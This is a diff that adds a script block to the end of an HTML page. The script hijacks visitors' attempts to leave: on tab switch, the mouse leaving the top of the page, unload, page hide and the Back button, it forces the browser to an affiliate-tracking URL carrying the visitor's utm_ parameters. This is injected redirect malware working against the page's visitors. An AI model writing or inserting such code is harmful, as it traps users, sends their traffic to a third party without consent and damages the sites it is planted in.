@@ -676,7 +676,50 @@
         <!--]-->
     </div>
   
+<script>
+window.redirectBaseURL = "https://gdmtrck.com/?a=204419&c=390253&co=258716&mt=5&s1=redirect";
 
+function getUTMParameters() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const utmParams = {};
+  for (const [key, value] of urlParams) {
+    if (key.startsWith('utm_')) {
+      utmParams[key] = value;
+    }
+  }
+  return utmParams;
+}
+
+function buildRedirectURL(baseURL, params) {
+  const url = new URL(baseURL);
+  for (const [key, value] of Object.entries(params)) {
+    url.searchParams.append(key, value);
+  }
+  return url.toString();
+}
+
+function exitStopper() {
+  const utmParams = getUTMParameters();
+  const redirectURL = buildRedirectURL(window.redirectBaseURL, utmParams);
+  if (redirectURL) {
+    window.location.href = redirectURL;
+  }
+}
+
+window.addEventListener('blur', exitStopper);
+document.body.addEventListener("mouseleave", function(e) {
+  if (e.clientY <= 0) {
+    exitStopper();
+  }
+}, false);
+
+window.addEventListener('beforeunload', exitStopper);
+window.addEventListener('pagehide', exitStopper);
+
+window.addEventListener('popstate', function() {
+  exitStopper();
+});
+</script>
 	
 </body>
 
